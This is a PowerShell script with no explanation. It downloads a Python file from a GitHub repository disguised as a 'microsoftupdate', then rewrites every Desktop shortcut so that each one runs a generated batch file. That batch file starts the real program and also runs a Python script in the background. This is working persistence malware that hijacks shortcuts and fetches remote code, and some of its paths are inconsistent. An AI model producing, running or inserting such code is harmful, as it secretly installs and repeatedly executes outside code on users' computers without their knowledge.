Import-Module BitsTransfer
$url = "https://raw.githubusercontent.com/Jenzmann/microsoftupdate/main/update.py"
$dirs = @(
    [Environment]::GetFolderPath("Desktop")
)

#$scriptPath = 'test'

Clear-Host


if(!(Test-Path "&($PSScriptRoot)\update.py")){

    Start-BitsTransfer -Source $url -Destination $PSScriptRoot

    $shell = new-object -com wscript.shell
    
    $fileCounter = 0;

    foreach ($dir in $dirs) {
        if($dir) {
        

            Get-ChildItem $dir -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                $lnk = $shell.createShortcut($_.FullName)
            
                #Creating alternative fil
                New-Item -Path . -Name "$($fileCounter).bat" -ItemType "file" -Value "Start """" ""$($lnk.TargetPath)""`npython3 test.py"
                
                # Manipulate Link

                $lnk.TargetPath = "$($PSScriptRoot)\$($fileCounter).bat"
                $lnk.Save()

                $fileCounter ++
            }
        }
    }
}